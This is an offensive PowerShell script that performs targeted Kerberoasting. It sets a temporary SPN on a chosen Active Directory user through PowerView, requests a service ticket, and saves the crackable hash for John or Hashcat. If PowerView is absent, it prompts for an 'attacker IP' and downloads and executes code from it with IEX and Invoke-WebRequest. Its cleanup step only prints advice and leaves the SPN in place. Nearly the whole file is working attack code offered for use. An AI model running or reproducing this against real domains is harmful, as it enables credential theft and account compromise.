<#
.SYNOPSIS
    Performs a targeted Kerberoast attack by temporarily setting an SPN
    on a specified domain user and requesting a Kerberos service ticket.

.DESCRIPTION
    This script attempts to:
      - Load PowerView (local or in-memory)
      - Verify WriteProperty / SPN modification permissions
      - Inject a temporary ServicePrincipalName (SPN) on a target user
      - Request a Kerberos TGS ticket encrypted with the user's NT hash
      - Extract and save the Kerberoast hash to disk

    No vulnerabilities are exploited — this relies solely on delegated
    Active Directory permissions.

.PARAMETER TargetUser
    The target domain user (sAMAccountName or distinguished name) on which
    the temporary SPN will be set.

.PARAMETER Domain
    The Active Directory domain name.
    Defaults to the current user's domain.

.PARAMETER AltUsername
    Optional alternate domain username used if the current context lacks
    permission to modify the target user object.

.PARAMETER AltPassword
    Password for the alternate domain user (plaintext).

.PARAMETER OutputFormat
    Kerberoast hash output format.
    Valid values:
      - John
      - Hashcat

.EXAMPLE
    PS C:\> .\Targeted-Kerberoast.ps1 -TargetUser sqlsvc

    Uses the current security context to inject an SPN and extract a
    Kerberoast hash for user 'sqlsvc'.

.EXAMPLE
    PS C:\> .\Targeted-Kerberoast.ps1 -TargetUser sqlsvc `
            -AltUsername delegatedUser `
            -AltPassword P@ssw0rd `
            -OutputFormat Hashcat

    Uses alternate credentials and outputs the hash in Hashcat format.

.OUTPUTS
    Writes the extracted Kerberos TGS hash to:
        hash_<yyyyMMdd_HHmmss>_<TargetUser>.txt

.NOTES
    Author: Scuba-Steev3
    Requires: PowerView.ps1
    Technique: Targeted Kerberoasting via SPN Injection
    OPSEC: SPN modification is logged in AD and should be cleaned up.

.LINK
    https://github.com/PowerShellMafia/PowerSploit
#>

param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUser,

    [string]$Domain = $env:USERDOMAIN,

    # Optional alternate creds for PowerView fallback
    [string]$AltUsername,
    [string]$AltPassword,

    # Kerberoast output format
    [ValidateSet("Hashcat","John")]
    [string]$OutputFormat = "John"

)

Write-Host "[*] Targeted Kerberoast Attack" -ForegroundColor Cyan
Write-Host "[*] Target User : $TargetUser"
Write-Host "[*] Domain      : $Domain"
Write-Host "[*] HashFormat  : $OutputFormat"
Write-Host

########################################
# Helper: Import PowerView 
########################################
function Import-PowerView {

    # Check if already loaded
    if (Get-Command Set-DomainObject -ErrorAction SilentlyContinue) {
        Write-Host "[+] PowerView already loaded" -ForegroundColor Green
        return $true
    }

    # Attempt local import
    if (Test-Path -Path  "PowerView.ps1") {
        Write-Host "[*] Attempting local PowerView import (.\\PowerView.ps1)"

        try {
            #Import-Module .\PowerView.ps1 -ErrorAction Stop
            #
            . .\PowerView.ps1
        } catch {
            Write-Warning "Local Import-Module failed"
        }
        Write-Host "[*] Attempting to verify command exists: Set-DomainObject"
        if (Get-Command Set-DomainObject -ErrorAction Stop) {
            Write-Host "[+] PowerView loaded from local file" -ForegroundColor Green
            return $true
        }
    }

    # TL;DR fallback — in-memory download
    Write-Warning "PowerView not loaded/on host"
    Write-Host  "[*] Provide IP and port to load PowerView in-memory" -ForegroundColor Yellow

    $IP   = Read-Host "Enter attacker IP hosting PowerView.ps1"
    $Port = Read-Host "Enter port (e.g. 8000)"

    if (-not $IP -or -not $Port) {
        Write-Error "IP/Port not provided — cannot load PowerView"
        return $false
    }

    $URL = "http://${IP}:${Port}/PowerView.ps1"
    Write-Host "[*] Loading PowerView from $URL"

    try {
        IEX (Invoke-WebRequest -UseBasicParsing -Uri $URL)
        
        #Import-Module .\PowerView.ps1 -ErrorAction Stop
        . .\PowerView.ps1
        
        Write-Host "[*] Attempting to verify command exists: Set-DomainObject"
        if (Get-Command Set-DomainObject -ErrorAction SilentlyContinue) {
            Write-Host "[+] PowerView loaded in-memory" -ForegroundColor Green
            return $true
        } else {
            throw "PowerView functions not available after import"
        }
    }
    catch {
        Write-Error "Failed to load PowerView: $_"
        return $false
    }
}

function New-TemporarySPN {
    param(
        [string]$Prefix,
        [string]$Service = "svc"
    )

    # Common, realistic SPN prefixes (Kerberos-friendly)
    $CommonSPNPrefixes = @(
        "HTTP",
        "MSSQLSvc",
        "CIFS",
        "HOST",
        "LDAP",
        "WSMAN",
        "RPCSS",
        "TERMSRV",
        "SMTP"
    )

    # Select random prefix if none supplied
    if (-not $Prefix) {
        $Prefix = Get-Random -InputObject $CommonSPNPrefixes
    }

    # Optional hostname context (helps in multi-operator labs)
    $HostTag = $env:COMPUTERNAME.ToLower()

    # Final SPN format
    # Example:

    $SPN = "$Prefix/fake.$HostTag.$Domain"

    return $SPN
}

function Test-WriteSPNAccess {
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetUser,

        [System.Management.Automation.PSCredential]$Credential
    )

    Write-Host "[*] Checking WriteProperty / WriteSPN permissions on target user"

    try {
        if ($Credential) {
            $ACLs = Get-DomainObjectAcl -Identity $TargetUser -ResolveGUIDs -Credential $Credential
        } else {
            $ACLs = Get-DomainObjectAcl -Identity $TargetUser -ResolveGUIDs
        }

        $WriteRights = $ACLs | Where-Object {
            $_.ActiveDirectoryRights -match "WriteProperty" -or
            $_.ObjectType -match "ServicePrincipalName"
        }

        if ($WriteRights) {
            Write-Host "[+] WriteProperty / SPN permissions detected" -ForegroundColor Green
            return $true
        } else {
            Write-Warning "No WriteProperty / SPN permissions detected — SPN modification may fail"
            return $false
        }
    }
    catch {
        Write-Warning "Could not enumerate ACLs (restricted environment)"
        Write-Warning "Proceeding anyway — Set-DomainObject may still succeed"
        return $true
    }
}

function Write-KerberoastHashToFile {
    param(
        [Parameter(Mandatory)]
        [string]$Hash,

        [Parameter(Mandatory)]
        [string]$TargetUser
    )

    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $FileName  = "hash_${Timestamp}_${TargetUser}.txt"

    $Hash | Out-File -FilePath $FileName -Encoding ascii -Force

    Write-Host "[+] Kerberoast hash written to file:" -ForegroundColor Green
    Write-Host "    $FileName" -ForegroundColor Yellow
}


########################################
# Step 1: Prepare alternate credentials
########################################
if ($AltUsername -and $AltPassword) {
    Write-Host "[*] Alternate credentials supplied (used if current context lacks rights)"
    # Credential object would be created here
} else {
    Write-Host "[*] Using current security context ($($env:USERNAME))"
}

if (-not (Import-PowerView)) {
    exit 1
}

$Cred=$null;
$SPN_Set = $false
$SPN_Ticket = $false

if ($AltUsername -and $AltPassword) {
    $CredPassword = ConvertTo-SecureString $AltPassword -AsPlainText -Force;
    $Cred = New-Object System.Management.Automation.PSCredential ("$Domain\$AltUsername", $CredPassword )
}

########################################
# Step 2: Modify SPN attribute (concept)
########################################
Write-Host "[*] Setting a temporary ServicePrincipalName on target user"
Write-Host "    - This requires write access to the user object"
Write-Host "    - No exploit, only delegated permissions"
try{
    $TempSPN = New-TemporarySPN
    Write-Host "[*] Generated temporary SPN:"
    Write-Host "    $TempSPN" -ForegroundColor Yellow
    #Get-Command Set-DomainObject
    ########################################
    # Step 1.5: Verify WriteSPN Permissions
    ########################################
    
    if ($Cred -is [System.Management.Automation.PSCredential])
    {
        if (-not (Test-WriteSPNAccess -TargetUser $TargetUser -Credential $Cred)) {
            Write-Warning "Insufficient rights detected — SPN injection may fail"
        }
        write-host "Command: "
        Write-host "   Set-DomainObject -Credential '$$Cred' -Identity $TargetUser -SET @{serviceprincipalname=$TempSPN}"
        Set-DomainObject -Credential $Cred -Identity $TargetUser -SET @{serviceprincipalname=$TempSPN} #After running this, you can use Get-DomainSPNTicket as follows
    }
    else
    {
        if (-not (Test-WriteSPNAccess -TargetUser $TargetUser )) {
            Write-Warning "Insufficient rights detected — SPN injection may fail"
        }
        write-host "Command: "
        Write-host "   Set-DomainObject -Identity $TargetUser -SET @{serviceprincipalname=$TempSPN}"
        Set-DomainObject -Identity $TargetUser -SET @{serviceprincipalname=$TempSPN} #After running this, you can use Get-DomainSPNTicket as follows
    }
    Write-Host "[+] Temporary ServicePrincipalName set using Set-DomainObject" -ForegroundColor Green;
    $SPN_Set = $true
}
catch {
    Write-Host "[!] Error occurred" -ForegroundColor Red
    Write-Host "    Message : $($_.Exception.Message)"
    Write-Host
    Write-Error "Setting a temporary ServicePrincipalName failed!"
    exit 1
}

########################################
# Step 3: Request Kerberos service ticket
########################################
if($SPN_Set)
{
    Write-Host "[*] Getting Domain User info for: $TargetUser"
    $targetUserIden = Get-DomainUser -Identity $TargetUser
    if ($targetUserIden.serviceprincipalname) {
        Write-Host "[+] SPN set on user $($TargetUser)" -ForegroundColor Green
        Write-Host "    - SPN: $($targetUserIden.serviceprincipalname)"
        Write-Host "[*] User: $($TargetUser)" -ForegroundColor Magenta
        Write-Host
        $targetUserIden
        Write-Host
    } else {
        Write-Host "[-] No SPNs set on user $($TargetUser)" -ForegroundColor Red
    }
    Write-Host
    Write-Host "[*] Requesting a service ticket for the modified SPN"
    Write-Host "    - KDC returns a TGS encrypted with the user's NT hash"
    Write-Host "    - Encrypted portion can be extracted"
    write-Host ""
    try {
        #Get-DomainSPNTicket -Credential $Cred harmj0y | fl
        if ($Cred -is [System.Management.Automation.PSCredential])
        {
            write-host "Command: "
            Write-host "   Get-DomainSPNTicket -SPN $TempSPN -Credential '$$Cred' -OutputFormat $OutputFormat"
            $Ticket = Get-DomainSPNTicket -SPN "$TempSPN" -Credential $Cred #-OutputFormat $OutputFormat 
        }
        else
        {
            write-host "Command: "
            Write-host "   Get-DomainSPNTicket -SPN $TempSPN -OutputFormat $OutputFormat"
            $Ticket = Get-DomainSPNTicket -SPN "$TempSPN" #-OutputFormat $OutputFormat 

            #Get-DomainSPNTicket -User $targetUserIden -OutputFormat $OutputFormat | fl
            #Get-DomainUser -SPN $TempSPN | Get-DomainSPNTicket -OutputFormat Hashcat
        }
        if ($Ticket.Hash) {
            Write-Host
            $Ticket.Hash
            Write-Host
            Write-KerberoastHashToFile -Hash $Ticket.Hash -TargetUser $TargetUser
            Write-Host "[+] Requested a service ticket for the modified SPN on: $($TargetUser)" -ForegroundColor Green;
            $SPN_Ticket = $true
        }
        else {
            Write-Warning "Ticket retrieved but no hash was extracted"
        }
        
    }
    catch
    {
        Write-Host "[!] Error occurred" -ForegroundColor Red
        Write-Host "    Message : $($_.Exception.Message)"
        Write-Host
        Write-Error "Could not get service ticket for $($TargetUser)"
    }
}

########################################
# Step 4: Cleanup
########################################
if ($SPN_Ticket)
{
    Write-Host
    Write-Host "[*] Recommended & Optional: Removing the temporary SPN attribute" -ForegroundColor Cyan
    Write-Host "    - Restores original directory state"
}

########################################
# End
########################################
Write-Host
if (-not $SPN_Ticket -and -not $SPN_Set)
{
    Write-Host "[!] No actions were executed. " -ForegroundColor Yellow
}
else
{
    Write-Host "-------------------------------------"
    Write-Host "Complete!"
}
